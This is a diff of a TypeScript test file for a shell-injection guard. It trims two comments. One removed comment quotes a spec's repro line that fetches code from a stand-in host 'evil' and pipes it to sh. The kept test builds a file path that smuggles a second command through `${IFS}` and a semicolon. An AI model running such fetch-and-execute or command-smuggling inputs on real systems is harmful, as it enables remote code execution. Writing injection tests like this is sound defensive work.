@@ -26,10 +26,8 @@ function makeHarness() {
   // string) a proxy call carried, not just that a call happened.
   const inputs: string[] = [];
   const handlers: Record<string, Handler[]> = {};
-  // `tbProxyResponses` queues Trigger E's `ui.input` replies (the
-  // `__LC_TB_SHELL__` proxy channel `tbProxyRun` calls) in FIFO order — one
-  // shift per call, `null`/`undefined` entries and an exhausted queue both
-  // resolve to `null`, matching a real proxy's "no usable response" cases.
+  // Queued `ui.input` replies for Trigger E's proxy calls; an empty queue is
+  // a proxy that gave nothing usable.
   const state = { sendThrows: false, tbProxyResponses: [] as (string | null)[] };
   const pi = {
     handlers,
@@ -1738,10 +1736,8 @@ describe("tb-finalize-guard", () => {
       // capture contained shell metacharacters could inject a second command
       // into the container shell that runs `wc -c`.
       const MARKER = `/tmp/tb-finalize-guard-injection-marker-${process.pid}`;
-      // `${IFS}` (default: space/tab/newline) is a classic no-literal-space
-      // way to spell a word break — the same technique the spec's own
-      // `curl${IFS}http://evil/x|sh` repro used; `touch`/local-file-only
-      // here so the live-shell run below has no network dependency.
+      // `${IFS}` spells a word break with no literal space; `touch` keeps the
+      // live-shell run below offline.
       const MALICIOUS_PATH = `/app/gpt2.c;touch\${IFS}${MARKER};true`;
 
       afterEach(() => {
